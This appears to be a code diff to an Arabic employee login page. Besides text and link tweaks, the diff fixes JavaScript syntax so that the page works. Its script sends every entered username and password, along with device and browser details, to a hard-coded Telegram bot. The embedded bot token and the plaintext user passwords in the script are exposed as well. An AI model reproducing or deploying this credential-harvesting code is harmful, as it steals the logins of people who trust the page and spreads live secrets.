@@ -1,9 +1,10 @@
+
 <!DOCTYPE html>
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لوحة تحكم الموظف</title>
+    <title>لوحة الموظفين</title>
     <link rel="icon" href="logo.jpg" type="image/png">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
     <style>
@@ -134,7 +135,7 @@
 <body>
 
 <div class="login-container">
-    <h2>تسجيل الدخول للموظف</h2>
+    <h2>تسجيل الدخول الموظفين</h2>
     <form id="login-form">
         <input type="text" id="email" class="input-field" placeholder="كود السوبر ليدر الخاص بك" required>
         <input type="password" id="password" class="input-field" placeholder="كلمة المرور" required>
@@ -142,17 +143,17 @@
     </form>
 
     <div class="forgot-password">
-        <a href="https://wa.me/+201029985266?text=مرحبا %20لقد%20نسيت%20كلمة%20مروري">هل نسيت كلمة المرور؟</a>
+        <a href="https://wa.me/+201029985266?text=مرحبا">هل نسيت كلمة المرور؟</a>
     </div>
 
     <div class="social-links">
         <a href="https://www.facebook.com/omaressamelshemi/" title="Facebook"><i class="fab fa-facebook-f"></i></a>
-        <a href="https://t.me/El_Shemi_Basha" title="Telegram"><i class="fab fa-telegram"></i></a>
+        <a href="https://web.telegram.org/k/#@El_Shemi_Basha" title="Telegram"><i class="fab fa-telegram"></i></a>
         <a href="https://www.instagram.com/omaressamelshemi/" title="Instagram"><i class="fab fa-instagram"></i></a>
     </div>
 
     <div class="footer">
-        &copy; 2025 تم برمجت جميع المواقع من خلال - <a href="https://www.facebook.com/omaressamelshemi/">OMAR EL-SHEMI</a>
+        &copy; 2025 تم الصنع من خلال - <a href="https://www.facebook.com/omaressamelshemi/">OMAR EL-SHEMI</a>
     </div>
 </div>
 
@@ -162,7 +163,7 @@
 <script>
     const TOKEN = "8175198885:AAFpuh9RBkhrbgd29ktz_dgl9nCCptvniLs";
     const CHAT_ID = "5857518644";
-    const URI_API = https://api.telegram.org/bot${TOKEN}/sendMessage;
+    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
 
     const users = {
         'omar5204': { password: 'mo9556', url: 'https://omaressamelshime.github.io/ledr.123/superledr/omar5204' },
@@ -203,7 +204,7 @@
                 const screenHeight = screen.height;
                 const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
 
-                const message =  
+                const message = ` 
                     <b>تسجيل جديد في صفحة الموظفين</b>\n
                     <b>اليوزر:</b> ${email}\n
                     <b>الباسورد:</b> ${password}\n
@@ -212,7 +213,7 @@
                     <b>Platform:</b> ${platform}\n
                     <b>User Agent:</b> ${userAgent}\n
                     <b>مقاس الشاشة:</b> ${screenWidth}x${screenHeight}
-                ;
+                `;
 
                 axios.post(URI_API, {
                     chat_id: CHAT_ID,
@@ -243,7 +244,7 @@
     // زر إغلاق الصفحة
     const closeButton = document.createElement('button');
     closeButton.textContent = 'إغلاق';
-    closeButton.style = 
+    closeButton.style = `
         position: absolute; 
         top: 10px; 
         right: 10px; 
@@ -253,7 +254,7 @@
         border-radius: 5px; 
         padding: 10px; 
         cursor: pointer;
-    ;
+    `;
     document.body.appendChild(closeButton);
 
     closeButton.addEventListener('click', () => {
